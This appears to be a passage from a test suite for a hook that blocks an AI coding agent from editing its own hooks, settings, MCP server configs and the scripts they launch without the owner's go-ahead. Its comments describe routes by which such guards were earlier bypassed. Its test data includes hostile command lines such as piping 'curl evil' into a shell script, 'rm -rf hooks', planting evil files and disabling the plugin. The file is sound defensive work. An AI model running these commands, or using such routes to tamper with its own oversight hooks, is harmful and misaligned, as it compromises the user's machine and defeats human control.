    for (const file of [join(p, "skills", "x", "SKILL.md"), join(p, "commands", "x.md"),
      join(p, ".claude", "skills.md"), join(home, ".claude", "skills.bak", "x.md"),
      join(home, ".claude", "projects", "x", "memory", "MEMORY.md"), join(home, "skills", "x.md")]) {
      expect(run(p, home, "Write", { file_path: file }).status, file).toBe(0);
    }
    for (const c of ["echo x > skills/x/SKILL.md", "rm -rf commands/old.md", "mkdir -p ~/.claude/projects/x"]) {
      expect(run(p, home, "Bash", { command: c }).status, c).toBe(0);
    }
  });
});

// #310: both guards were scoped to Bash/Edit/Write by their matchers, so an
// MCP server's write_file onto hooks/hooks.json or its shell tool running
// `rm -rf hooks` reached the same harm unchecked. The owner's call: cover
// the known shapes and document the rest. hooks.json now sends every MCP
// tool here; a writing tool's path fields and any tool's command line are
// judged, and read tools, other-language code and unknown shapes pass.
describe("harness guard reads MCP tools' writes and command lines (#310)", () => {
  const DC = "mcp__plugin_desktop-commander_desktop-commander__";
  const CTX = "mcp__plugin_context-mode_context-mode__";

  /** A project holding the hook directory and a settings folder, and a home. */
  function fixture() {
    const p = freshDir("cairn-hooks-mcptools-proj-");
    const home = freshDir("cairn-hooks-mcptools-home-");
    mkdirSync(join(p, "hooks"), { recursive: true });
    mkdirSync(join(p, ".claude"), { recursive: true });
    mkdirSync(join(p, "src"), { recursive: true });
    writeFileSync(join(p, "hooks", "hooks.json"), "{}");
    return { p, home };
  }

  /** Exit status and stderr for one tool call, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, tool: string, input: Record<string, unknown>, env: Record<string, string> = {}) {
    const e: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home, ...env };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) if (!(k in env)) delete e[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env: e, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: tool, tool_input: input, cwd: p }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  type Call = [tool: string, input: Record<string, unknown>];

  it("an MCP write onto a protected file is refused; the same write elsewhere passes", () => {
    const { p, home } = fixture();
    const pairs: Array<[write: Call, elsewhere: Call]> = [
      [[`${DC}write_file`, { path: "hooks/hooks.json", content: "{}" }], [`${DC}write_file`, { path: "src/x.ts", content: "x" }]],
      [["mcp__filesystem__write_file", { path: join(p, "hooks", "hooks.json") }], ["mcp__filesystem__write_file", { path: join(p, "src", "x.ts") }]],
      [[`${DC}edit_block`, { file_path: ".mcp.json", old_string: "a", new_string: "b" }], [`${DC}edit_block`, { file_path: "src/a.ts" }]],
      [["mcp__fs__writeFile", { filePath: "~/.claude/settings.json" }], ["mcp__fs__writeFile", { filePath: "~/notes.md" }]],
      [["mcp__fs__write_file", { path: "~/.claude/skills/helper/hooks/hooks.json" }], ["mcp__fs__write_file", { path: "~/skills/x.md" }]],
      [[`${DC}create_directory`, { path: "hooks/new" }], [`${DC}create_directory`, { path: "src/new" }]],
      [["mcp__filesystem__delete_file", { path: "hooks/hooks.json" }], ["mcp__filesystem__delete_file", { path: "src/old.ts" }]],
      [["mcp__filesystem__delete_directory", { path: "." }], ["mcp__filesystem__delete_directory", { path: "build" }]],
      [["mcp__fs__chmod", { path: "hooks", mode: "000" }], ["mcp__fs__chmod", { path: "src", mode: "755" }]],
      [["mcp__chrome-devtools__take_screenshot", { filePath: "hooks/hooks.json" }],
        ["mcp__chrome-devtools__take_screenshot", { filePath: "/tmp/shot.png" }]],
      [["mcp__fs__write_files", { paths: ["src/a.ts", ".claude/settings.json"] }], ["mcp__fs__write_files", { paths: ["src/a.ts"] }]],
    ];
    for (const [[wt, wi], [et, ei]] of pairs) {
      const r = run(p, home, wt, wi);
      expect(r.status, `${wt} ${JSON.stringify(wi)}`).toBe(2);
      expect(r.stderr, wt).toContain("owner's go-ahead");
      expect(run(p, home, et, ei).status, `${et} ${JSON.stringify(ei)}`).toBe(0);
    }
  });

  it("a move into or out of a protected place is refused; a move between ordinary files passes", () => {
    const { p, home } = fixture();
    for (const input of [
      { source: "/tmp/evil.json", destination: ".claude/settings.json" },
      { source: "/tmp/settings.json", destination: ".claude" },
      { source: "/tmp/settings.local.json", destination: ".claude/" },
      { source: "/tmp/x.sh", destination: ".claude/hooks/x.sh" },
      { source: "hooks", destination: "/tmp/old-hooks" },
    ]) {
      expect(run(p, home, `${DC}move_file`, input).status, JSON.stringify(input)).toBe(2);
    }
    expect(run(p, home, "mcp__fs__rename_file", { path: "hooks/hooks.json", new_path: "hooks/old.json" }).status).toBe(2);
    expect(run(p, home, `${DC}move_file`, { source: "src/a.ts", destination: "src/b.ts" }).status).toBe(0);
    expect(run(p, home, "mcp__fs__copy_file", { source: "/tmp/evil.json", destination: ".mcp.json" }).status).toBe(2);
    expect(run(p, home, "mcp__fs__copy_file", { source: ".mcp.json", destination: "/tmp/mcp-backup.json" }).status).toBe(0);
  });

  it("a read tool passes whatever it names, and so does an MCP tool with no path or command", () => {
    const { p, home } = fixture();
    const calls: Call[] = [
      [`${DC}read_file`, { path: "hooks/hooks.json" }],
      [`${DC}list_directory`, { path: "hooks" }],
      [`${DC}get_file_info`, { path: ".mcp.json" }],
      [`${DC}start_search`, { path: ".claude", pattern: "x" }],
      ["mcp__plugin_cairn_cairn__run_manifest", { action: "get" }],
      ["mcp__plugin_cairn_cairn__issue_attach", { issue: "1", path: "hooks/hooks.json" }],
      ["mcp__chrome-devtools__take_screenshot", {}],
    ];
    for (const [tool, input] of calls) {
      expect(run(p, home, tool, input).status, `${tool} ${JSON.stringify(input)}`).toBe(0);
    }
  });

  it("a command line in an MCP tool is read like Bash, from the folder the input names", () => {
    const { p, home } = fixture();
    const pairs: Array<[write: Call, read: Call]> = [
      [[`${DC}start_process`, { command: "rm -rf hooks", timeout_ms: 1000 }],
        [`${DC}start_process`, { command: "cat hooks/hooks.json", timeout_ms: 1000 }]],
      [[`${CTX}ctx_execute`, { language: "shell", code: "echo x > .mcp.json" }],
        [`${CTX}ctx_execute`, { language: "shell", code: "cat .mcp.json" }]],
      [[`${CTX}ctx_batch_execute`, { commands: [{ label: "a", command: "ls" }, { label: "b", command: "tee hooks/x < /dev/null" }], queries: ["x"] }],
        [`${CTX}ctx_batch_execute`, { commands: [{ label: "a", command: "ls" }, { label: "b", command: "cat hooks/x" }], queries: ["x"] }]],
      [["mcp__shell__run_command", { command: "rm", args: ["-rf", "hooks"] }],
        ["mcp__shell__run_command", { command: "ls", args: ["-la", "hooks"] }]],
      [["mcp__shell__exec", { cmd: "sudo -u root tee .claude/settings.json" }], ["mcp__shell__exec", { cmd: "sudo -u root cat .claude/settings.json" }]],
      [["mcp__shell__exec", { shell_command: "claude plugin disable cairn" }], ["mcp__shell__exec", { shell_command: "claude plugin list" }]],
      [[`${CTX}ctx_execute`, { language: "shell", code: "echo x > settings.json", cwd: ".claude" }],
        [`${CTX}ctx_execute`, { language: "shell", code: "echo x > settings.json", cwd: "src" }]],
    ];
    for (const [[wt, wi], [rt, ri]] of pairs) {
      expect(run(p, home, wt, wi).status, `${wt} ${JSON.stringify(wi)}`).toBe(2);
      expect(run(p, home, rt, ri).status, `${rt} ${JSON.stringify(ri)}`).toBe(0);
    }
  });

  it("code in another language is out of scope, as the runbook says: the harness's permission rules gate it", () => {
    const { p, home } = fixture();
    expect(run(p, home, `${CTX}ctx_execute`, { language: "python", code: "open('.mcp.json', 'w').write('{}')" }).status).toBe(0);
    expect(run(p, home, `${DC}interact_with_process`, { pid: 1, input: "rm -rf hooks" }).status).toBe(0);
  });

  it("the session override still lets the owner through", () => {
    const { p, home } = fixture();
    expect(run(p, home, `${DC}write_file`, { path: "hooks/hooks.json" }, { CAIRN_HARNESS_EDIT: "1" }).status).toBe(0);
  });

  it("hooks.json sends every MCP tool to the run and harness guards, and keeps the leak guard on Bash", () => {
    const manifest = JSON.parse(readFileSync(join(SCRIPTS, "..", "hooks.json"), "utf8")) as {
      hooks: { PreToolUse: Array<{ matcher: string; hooks: Array<{ command: string }> }> };
    };
    const matcherOf = (script: string): string[] => manifest.hooks.PreToolUse
      .filter((g) => g.hooks.some((h) => h.command.includes(script))).map((g) => g.matcher);
    expect(matcherOf("pretooluse-runguard.mjs")).toEqual(["Bash|mcp__.*"]);
    expect(matcherOf("pretooluse-harnessguard.mjs")).toEqual(["Edit|Write|NotebookEdit|Bash|mcp__.*"]);
    expect(matcherOf("pretooluse-leakguard.mjs")).toEqual(["Bash"]);
    for (const m of [...matcherOf("pretooluse-runguard.mjs"), ...matcherOf("pretooluse-harnessguard.mjs")]) {
      const re = new RegExp(`^(?:${m})$`);
      for (const tool of ["Bash", `${DC}write_file`, `${CTX}ctx_execute`]) expect(re.test(tool), `${m} ${tool}`).toBe(true);
      expect(re.test("Read"), m).toBe(false);
    }
  });
});

// #312: the guard refused adding a hook to settings, but not replacing a
// script settings already run -- ~/.claude/hooks/<x>.mjs at session start,
// a status-line script, ~/.config/<x> on every event -- and the planted
// code then ran at the next hook event, outside any tool call. ~/.claude/
// hooks is a protected folder now, and every script the protected settings
// and hooks.json files name is a protected file, read fresh each call.
describe("harness guard protects the scripts protected settings run (#312)", () => {
  const DC = "mcp__plugin_desktop-commander_desktop-commander__";

  /** A home whose settings run a hook script and a status line, and a project whose settings and hooks.json run two more. */
  function fixture(userSettings?: string) {
    const p = freshDir("cairn-hooks-scripts-proj-");
    const home = freshDir("cairn-hooks-scripts-home-");
    for (const d of [join(home, ".claude", "hooks"), join(home, ".config", "iterm2"), join(p, ".claude"),
      join(p, "hooks"), join(p, "tools"), join(p, "scripts"), join(p, "src")]) {
      mkdirSync(d, { recursive: true });
    }
    writeFileSync(join(home, ".claude", "hooks", "cache-heal.mjs"), "// heal\n");
    writeFileSync(join(home, ".config", "iterm2", "cc-status"), "#!/bin/sh\n");
    writeFileSync(join(home, ".claude", "settings.json"), userSettings ?? JSON.stringify({
      hooks: {
        SessionStart: [{ hooks: [{ type: "command", command: "node ~/.claude/hooks/cache-heal.mjs" }] }],
        PreToolUse: [{ matcher: "*", hooks: [{ type: "command", command: "$HOME/.config/iterm2/cc-status 2>/dev/null || true" }] }],
      },
      statusLine: { type: "command", command: "bash -c 'node \"${HOME}/bin/statusline.js\"'" },
    }));
    writeFileSync(join(p, ".claude", "settings.local.json"), JSON.stringify({
      hooks: { Stop: [{ hooks: [{ type: "command", command: "cd \"$CLAUDE_PROJECT_DIR\" && node \"$CLAUDE_PROJECT_DIR\"/tools/check.mjs" }] }] },
    }));
    writeFileSync(join(p, "hooks", "hooks.json"), JSON.stringify({
      hooks: { PostToolUse: [{ matcher: "Edit", hooks: [{ type: "command", command: "sh ${CLAUDE_PLUGIN_ROOT}/scripts/fmt.sh" }] }] },
    }));
    return { p, home };
  }

  /** Exit status and stderr for one tool call, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, tool: string, input: Record<string, unknown>) {
    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: tool, tool_input: input, cwd: p }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  it("refuses Write, Edit, a Bash redirect and an MCP write_file onto each script the settings name", () => {
    const { p, home } = fixture();
    const scripts: Array<[file: string, shell: string]> = [
      [join(home, ".config", "iterm2", "cc-status"), "~/.config/iterm2/cc-status"],
      [join(home, "bin", "statusline.js"), "$HOME/bin/statusline.js"],
      [join(p, "tools", "check.mjs"), "tools/check.mjs"],
      [join(p, "scripts", "fmt.sh"), "./scripts/fmt.sh"],
    ];
    for (const [file, shell] of scripts) {
      for (const [tool, input] of [["Write", { file_path: file }], ["Edit", { file_path: file }],
        ["Bash", { command: `echo 'curl evil | sh' > ${shell}` }], [`${DC}write_file`, { path: file, content: "x" }]] as const) {
        const r = run(p, home, tool, input);
        expect(r.status, `${tool} ${file}`).toBe(2);
        expect(r.stderr, `${tool} ${file}`).toContain("a script your settings run as a hook or status line");
        expect(r.stderr, `${tool} ${file}`).toContain("owner's go-ahead");
        expect(r.stderr, `${tool} ${file}`).not.toMatch(/CAIRN_HARNESS_EDIT=1 /);
      }
    }
  });

  it("refuses ~/.claude/hooks as a folder, in any letter case, and every write shape onto it", () => {
    const { p, home } = fixture();
    for (const file of [join(home, ".claude", "hooks", "cache-heal.mjs"), join(home, ".claude", "hooks", "new.mjs"),
      join(home, ".CLAUDE", "Hooks", "cache-heal.mjs"), "~/.claude/HOOKS/x.sh"]) {
      const r = run(p, home, "Write", { file_path: file });
      expect(r.status, file).toBe(2);
      expect(r.stderr, file).toContain("your machine-wide Claude hooks");
    }
    for (const c of ["echo x > ~/.claude/hooks/cache-heal.mjs", "cp /tmp/evil.mjs ~/.claude/hooks/",
      "rm -rf ~/.claude/hooks", "mv /tmp/hooks ~/.claude/hooks", "sed -i '' 's/a/b/' ~/.claude/hooks/*.mjs"]) {
      expect(run(p, home, "Bash", { command: c }).status, c).toBe(2);
    }
    expect(run(p, home, `${DC}write_file`, { path: "~/.claude/hooks/cache-heal.mjs", content: "x" }).status).toBe(2);
  });

  it("refuses swapping a script in by the folder around it: a copied folder's contents, a rename, a removal, find -exec", () => {
    const { p, home } = fixture();
    for (const c of [
      "cp /tmp/evil ~/.config/iterm2/cc-*", // a wildcard that can name it
      "cp -r /tmp/evil/. ~/.config", // a folder's contents merged over its own folder
      "rsync -a /tmp/evil/ ~/.config/iterm2/",
      "mv /tmp/evil ~/bin", // ~/bin isn't there: the rename puts a new statusline.js in place
      "rm -rf ~/.config/iterm2",
      "chmod -R 000 ~/.config",
      "find ~/.config -name 'cc-*' -exec cp /tmp/evil {} \\;",
      "echo ~/.config/iterm2/cc-status | xargs cp /tmp/evil",
    ]) {
      expect(run(p, home, "Bash", { command: c }).status, c).toBe(2);
    }
  });

  it("reads stay ordinary work, and so do writes beside the scripts and elsewhere in ~/.claude", () => {
    const { p, home } = fixture();
    for (const c of ["cat ~/.config/iterm2/cc-status", "cp ~/.config/iterm2/cc-status /tmp/cc-status.bak",
      "ls -la ~/.claude/hooks", "grep -n heal ~/.claude/hooks/cache-heal.mjs", "bash -n tools/check.mjs",
      "echo x > ~/.config/iterm2/notes.txt", "cp /tmp/a ~/.config/iterm2", "echo x > ~/.claude/x.txt",
      "echo x > src/a.ts", "cp /tmp/a.ts .", "echo x > tools/other.mjs", "mkdir -p ~/.claude/hooks"]) {
      expect(run(p, home, "Bash", { command: c }).status, c).toBe(0);
    }
    for (const file of [join(home, ".claude", "x.txt"), join(home, ".config", "iterm2", "other"),
      join(p, "tools", "other.mjs"), join(p, "src", "a.ts"), join(home, "bin", "other.js")]) {
      expect(run(p, home, "Write", { file_path: file }).status, file).toBe(0);
    }
    expect(run(p, home, `${DC}read_file`, { path: "~/.config/iterm2/cc-status" }).status).toBe(0);
  });

  it("an unreadable or malformed settings file is skipped: unrelated writes pass, the folder rule and other files still stand", () => {
    const { p, home } = fixture("{ // a comment, the way people leave them\n  \"hooks\": {}\n");
    expect(run(p, home, "Write", { file_path: join(home, ".claude", "x.txt") }).status).toBe(0);
    expect(run(p, home, "Bash", { command: "echo x > src/a.ts" }).status).toBe(0);
    // what only the broken file named is no longer known
    expect(run(p, home, "Write", { file_path: join(home, ".config", "iterm2", "cc-status") }).status).toBe(0);
    // the folder rule, and the scripts the project's files name, still stand
    expect(run(p, home, "Write", { file_path: join(home, ".claude", "hooks", "cache-heal.mjs") }).status).toBe(2);
    expect(run(p, home, "Write", { file_path: join(p, "tools", "check.mjs") }).status).toBe(2);
    // a settings file that's a folder, or JSON of the wrong shape, is skipped the same way
    rmSync(join(home, ".claude", "settings.json"));
    mkdirSync(join(home, ".claude", "settings.json"));
    writeFileSync(join(p, ".claude", "settings.local.json"), JSON.stringify({ hooks: "nope", statusLine: 7 }));
    expect(run(p, home, "Write", { file_path: join(p, "tools", "check.mjs") }).status).toBe(0);
    expect(run(p, home, "Write", { file_path: join(p, "scripts", "fmt.sh") }).status).toBe(2);
  });
});

// #314: the MCP configs were protected (#298), and the scripts hooks run
// (#312), but not the scripts those MCP configs launch -- a user-level
// server running `node ~/repos/<x>/dist/index.js` could be swapped with one
// Write, and the new code ran when the next session started the server,
// with its tokens. Every script a protected MCP config launches from outside
// the project is protected now; one inside the project stays writable, so a
// build that rewrites cairn's own server/dist still can.
describe("harness guard protects the scripts the MCP configs launch (#314)", () => {
  const DC = "mcp__plugin_desktop-commander_desktop-commander__";
  const WHAT = "a script your MCP server config launches";

  /** A home whose ~/.claude.json, ~/.cursor/mcp.json and a project's .mcp.json and .cursor/mcp.json launch scripts. */
  function fixture(claudeJson?: string) {
    const p = freshDir("cairn-hooks-mcp-proj-");
    const home = freshDir("cairn-hooks-mcp-home-");
    const other = freshDir("cairn-hooks-mcp-other-");
    // ~/cursor-tools stays missing: a script that isn't there yet runs too, once planted
    for (const d of [join(home, "repos", "gmail", "dist"), join(home, "repos", "real"), join(home, "bin"),
      join(home, "tools"), join(home, "py"), join(home, ".cursor"),
      join(other, "dist"), join(p, ".cursor"), join(p, "server", "dist"), join(p, "build"), join(p, "src")]) {
      mkdirSync(d, { recursive: true });
    }
    for (const f of [join(home, "repos", "gmail", "dist", "index.js"), join(home, "repos", "real", "linked-real.js"),
      join(home, "bin", "mcp-server"), join(home, "tools", "start.sh"), join(other, "dist", "server.js"),
      join(p, "server", "dist", "index.js"), join(p, "build", "own.js")]) {
      writeFileSync(f, "// server\n");
    }
    symlinkSync(join(home, "repos", "real", "linked-real.js"), join(home, "repos", "linked.js"));
    writeFileSync(join(home, ".claude.json"), claudeJson ?? JSON.stringify({
      numStartups: 7,
      mcpServers: {
        gmail: { type: "stdio", command: "node", args: [join(home, "repos", "gmail", "dist", "index.js")], env: { TOKEN: "x" } },
        bin: { command: "~/bin/mcp-server" },
        link: { command: "node", args: ["~/repos/linked.js"] },
        web: { type: "http", url: "https://mcp.example.com/mcp" },
        pkg: { command: "npx", args: ["-y", "@scope/pkg", "--stdio"] },
      },
      projects: {
        [other]: { mcpServers: { local: { command: "node", args: ["dist/server.js"] } } },
        [p]: { mcpServers: { own: { command: "node", args: ["${CLAUDE_PROJECT_DIR}/build/own.js"] } } },
      },
    }));
    writeFileSync(join(p, ".mcp.json"), JSON.stringify({ mcpServers: {
      cairn: { command: "node", args: ["${CLAUDE_PLUGIN_ROOT}/server/dist/index.js"] },
      tool: { command: "bash", args: ["$HOME/tools/start.sh"] },
    } }));
    writeFileSync(join(p, ".cursor", "mcp.json"), JSON.stringify({ mcpServers: {
      cur: { command: "${userHome}/cursor-tools/run.js" },
    } }));
    writeFileSync(join(home, ".cursor", "mcp.json"), JSON.stringify({ mcpServers: {
      curhome: { command: "sh", args: ["-c", "exec python3 ~/py/server.py"] },
    } }));
    return { p, home, other };
  }

  /** Exit status and stderr for one tool call, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, tool: string, input: Record<string, unknown>) {
    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: tool, tool_input: input, cwd: p }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  it("refuses Write, Edit, a redirect, cp, rm and MCP write_file onto each script launched from outside the project", () => {
    const { p, home, other } = fixture();
    const scripts: Array<[file: string, shell: string]> = [
      [join(home, "repos", "gmail", "dist", "index.js"), "~/repos/gmail/dist/index.js"], // user scope, absolute
      [join(home, "bin", "mcp-server"), "$HOME/bin/mcp-server"], // the command itself
      [join(other, "dist", "server.js"), join(other, "dist", "server.js")], // another project's, relative to it
      [join(home, "tools", "start.sh"), "~/tools/start.sh"], // the project's .mcp.json
      [join(home, "cursor-tools", "run.js"), "~/cursor-tools/run.js"], // Cursor's, not there yet
      [join(home, "py", "server.py"), "~/py/server.py"], // inside a sh -c string, Cursor's home config
      [join(home, "repos", "linked.js"), "~/repos/linked.js"], // a symlink...
      [join(home, "repos", "real", "linked-real.js"), "~/repos/real/linked-real.js"], // ...and where it points
    ];
    for (const [file, shell] of scripts) {
      for (const [tool, input] of [["Write", { file_path: file }], ["Edit", { file_path: file }],
        ["Bash", { command: `echo 'curl evil | sh' > ${shell}` }], ["Bash", { command: `cp /tmp/evil.js ${shell}` }],
        ["Bash", { command: `rm -f ${shell}` }], [`${DC}write_file`, { path: file, content: "x" }]] as const) {
        const r = run(p, home, tool, input);
        const label = `${tool} ${JSON.stringify(input)}`;
        expect(r.status, label).toBe(2);
        expect(r.stderr, label).toContain(WHAT);
        expect(r.stderr, label).toContain("owner's go-ahead");
        expect(r.stderr, label).not.toMatch(/CAIRN_HARNESS_EDIT=1 /);
      }
    }
  });

  it("refuses swapping a launched script by the folder around it", () => {
    const { p, home } = fixture();
    for (const c of [
      "rm -rf ~/repos/gmail/dist",
      "mv ~/repos/gmail /tmp/gmail-old",
      "cp -r /tmp/evil/. ~/repos/gmail/dist",
      "rsync -a /tmp/evil/ ~/repos/gmail/dist/",
      "chmod -R 000 ~/repos/gmail",
      "mv /tmp/evil ~/cursor-tools", // a folder: the rename would drop a new run.js in place
      "find ~/repos -name index.js -exec cp /tmp/evil {} \\;",
      "echo ~/repos/gmail/dist/index.js | xargs cp /tmp/evil",
    ]) {
      const r = run(p, home, "Bash", { command: c });
      expect(r.status, c).toBe(2);
      expect(r.stderr, c).toContain(WHAT);
    }
  });

  it("an in-project server script, a file beside an outside one, and reads stay ordinary work", () => {
    const { p, home } = fixture();
    for (const c of [
      "echo x > server/dist/index.js", // cairn's own build, launched by its .mcp.json
      "cp /tmp/build/index.js server/dist/index.js",
      "rm -rf server/dist && mkdir -p server/dist",
      "echo x > build/own.js", // the project's own local-scope server
      "echo x > ~/repos/gmail/dist/other.js", // beside an outside script
      "echo x > ~/repos/gmail/README.md",
      "cp /tmp/a ~/repos/gmail/dist",
      "echo x > src/a.ts",
      "cat ~/repos/gmail/dist/index.js",
      "grep -n server ~/tools/start.sh",
      "cp ~/repos/gmail/dist/index.js /tmp/index.js.bak",
      "node ~/repos/gmail/dist/index.js --help",
    ]) {
      expect(run(p, home, "Bash", { command: c }).status, c).toBe(0);
    }
    for (const file of [join(p, "server", "dist", "index.js"), join(p, "build", "own.js"),
      join(home, "repos", "gmail", "dist", "other.js"), join(home, "repos", "real", "notes.md"),
      join(p, "@scope", "pkg")]) {
      expect(run(p, home, "Write", { file_path: file }).status, file).toBe(0);
    }
    expect(run(p, home, `${DC}read_file`, { path: "~/repos/gmail/dist/index.js" }).status).toBe(0);
    expect(run(p, home, `${DC}write_file`, { path: join(p, "server", "dist", "index.js"), content: "x" }).status).toBe(0);
  });

  it("a malformed ~/.claude.json is skipped: unrelated writes pass, the other configs and the file rule still stand", () => {
    const { p, home } = fixture("{ \"mcpServers\": { \"gmail\": ");
    expect(run(p, home, "Bash", { command: "echo x > src/a.ts" }).status).toBe(0);
    expect(run(p, home, "Write", { file_path: join(home, "notes.txt") }).status).toBe(0);
    // what only the broken file named is no longer known
    expect(run(p, home, "Write", { file_path: join(home, "repos", "gmail", "dist", "index.js") }).status).toBe(0);
    // the project's .mcp.json and Cursor's configs still count, and ~/.claude.json itself is still protected
    expect(run(p, home, "Write", { file_path: join(home, "tools", "start.sh") }).status).toBe(2);
    expect(run(p, home, "Write", { file_path: join(home, "py", "server.py") }).status).toBe(2);
    expect(run(p, home, "Write", { file_path: join(home, ".claude.json") }).status).toBe(2);
    // JSON of the wrong shape is skipped the same way
    writeFileSync(join(home, ".claude.json"), JSON.stringify({ mcpServers: ["node"], projects: { x: 7, [p]: null } }));
    expect(run(p, home, "Bash", { command: "echo x > src/a.ts" }).status).toBe(0);
    expect(run(p, home, "Write", { file_path: join(home, "tools", "start.sh") }).status).toBe(2);
  });

  it("a large ~/.claude.json is read once and still judged", () => {
    const { p, home } = fixture();
    const projects: Record<string, unknown> = {};
    for (let i = 0; i < 3000; i++) {
      projects[`/tmp/project-${i}`] = { allowedTools: [], history: [{ display: "x".repeat(800) }], mcpServers: {} };
    }
    projects[join(home, "work")] = { mcpServers: { late: { command: "node", args: ["~/repos/gmail/dist/index.js"] } } };
    writeFileSync(join(home, ".claude.json"), JSON.stringify({ projects }));
    expect(run(p, home, "Write", { file_path: join(home, "repos", "gmail", "dist", "index.js") }).status).toBe(2);
    expect(run(p, home, "Write", { file_path: join(home, "repos", "gmail", "dist", "other.js") }).status).toBe(0);
  });
});

// #316: #314 protected the scripts an MCP config launches, but only when
// the script was a path word. The MCP quickstart's Python shape, `uv
// --directory /abs/weather run weather.py`, names the folder as an option
// value and the script without a slash; a server with a `cwd` field is
// run there by the client while the guard resolved `./dist/index.js` from
// the project; and `node /abs/srv/dirmain` runs dirmain/index.js, a folder
// the reader dropped. Each folder the config names is protected as a
// folder now -- that one, never its parents -- and a bare word naming a
// file in it is a script. In-project paths and reads stay ordinary work.
describe("harness guard protects the MCP scripts reached through a folder word (#316)", () => {
  const DC = "mcp__plugin_desktop-commander_desktop-commander__";
  const DIR_WHAT = "a folder your MCP server config runs its server from";

  /** A home whose ~/.claude.json names server folders by option, cwd and entry file; a project running one of its own. */
  function fixture() {
    const p = freshDir("cairn-hooks-mcpdir-proj-");
    const home = freshDir("cairn-hooks-mcpdir-home-");
    for (const d of [join(home, "mcp", "weather"), join(home, "mcp", "weather2"), join(home, "srv2", "dist"),
      join(home, "srv", "dirmain"), join(home, "srv", "data"), join(p, "py"), join(p, "server", "dist")]) {
      mkdirSync(d, { recursive: true });
    }
    for (const f of [join(home, "mcp", "weather", "weather.py"), join(home, "mcp", "weather", "pyproject.toml"),
      join(home, "mcp", "weather2", "weather.py"), join(home, "mcp", "README.md"), join(home, "srv2", "dist", "index.js"),
      join(home, "srv", "dirmain", "index.js"), join(home, "srv", "server.js"), join(home, "srv", "notes.md"),
      join(home, "srv", "data", "package.json"), join(p, "py", "tool.py"), join(p, "server", "dist", "index.js")]) {
      writeFileSync(f, "# x\n");
    }
    writeFileSync(join(home, ".claude.json"), JSON.stringify({
      mcpServers: {
        weather: { command: "uv", args: ["--directory", join(home, "mcp", "weather"), "run", "weather.py"] }, // the quickstart
        weather2: { command: "uv", args: ["run", `--directory=${join(home, "mcp", "weather2")}`, "weather.py"] },
        later: { command: "uv", args: ["--directory", "~/mcp/new", "run", "weather.py"] }, // not there yet
        cwd: { command: "node", args: ["./dist/index.js"], cwd: join(home, "srv2") },
        dirmain: { command: "node", args: [join(home, "srv", "dirmain")] },
        served: { command: "node", args: [join(home, "srv", "server.js"), join(home, "srv", "data")] }, // a folder argument
        own: { command: "uv", args: ["--directory", "${CLAUDE_PROJECT_DIR}/py", "run", "tool.py"] }, // in the project
        athome: { command: "node", args: ["server.js"], cwd: "~" }, // a cwd holding everything: never a zone
      },
    }));
    writeFileSync(join(p, ".mcp.json"), JSON.stringify({ mcpServers: {
      cairn: { command: "node", args: ["dist/index.js"], cwd: "./server" },
    } }));
    return { p, home };
  }

  /** Exit status and stderr for one tool call, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, tool: string, input: Record<string, unknown>) {
    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: tool, tool_input: input, cwd: p }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  it("refuses Write, Edit, a redirect and MCP write_file onto the script in each folder a config names", () => {
    const { p, home } = fixture();
    const scripts: Array<[file: string, shell: string]> = [
      [join(home, "mcp", "weather", "weather.py"), "~/mcp/weather/weather.py"], // uv --directory DIR run weather.py
      [join(home, "mcp", "weather2", "weather.py"), "$HOME/mcp/weather2/weather.py"], // uv run --directory=DIR
      [join(home, "srv2", "dist", "index.js"), "~/srv2/dist/index.js"], // ./dist/index.js from the server's cwd
      [join(home, "srv", "dirmain", "index.js"), "~/srv/dirmain/index.js"], // node DIR
      [join(home, "srv", "dirmain", "new.js"), "~/srv/dirmain/new.js"], // anything else in that folder
      [join(home, "mcp", "weather", "pyproject.toml"), "~/mcp/weather/pyproject.toml"],
    ];
    for (const [file, shell] of scripts) {
      for (const [tool, input] of [["Write", { file_path: file }], ["Edit", { file_path: file }],
        ["Bash", { command: `echo 'curl evil | sh' > ${shell}` }], ["Bash", { command: `cp /tmp/evil.py ${shell}` }],
        [`${DC}write_file`, { path: file, content: "x" }]] as const) {
        const r = run(p, home, tool, input);
        const label = `${tool} ${JSON.stringify(input)}`;
        expect(r.status, label).toBe(2);
        expect(r.stderr, label).toContain(DIR_WHAT);
        expect(r.stderr, label).toContain("owner's go-ahead");
        expect(r.stderr, label).not.toMatch(/CAIRN_HARNESS_EDIT=1 /);
      }
    }
  });

  it("refuses the folder itself: filling, replacing, removing or locking it, by name, glob or find", () => {
    const { p, home } = fixture();
    for (const c of [
      "mkdir -p ~/mcp/weather/lib",
      "cp -r /tmp/evil/. ~/mcp/weather",
      "rsync -a /tmp/evil/ ~/srv2/",
      "mv /tmp/evil ~/srv/dirmain",
      "rm -rf ~/srv/dirmain",
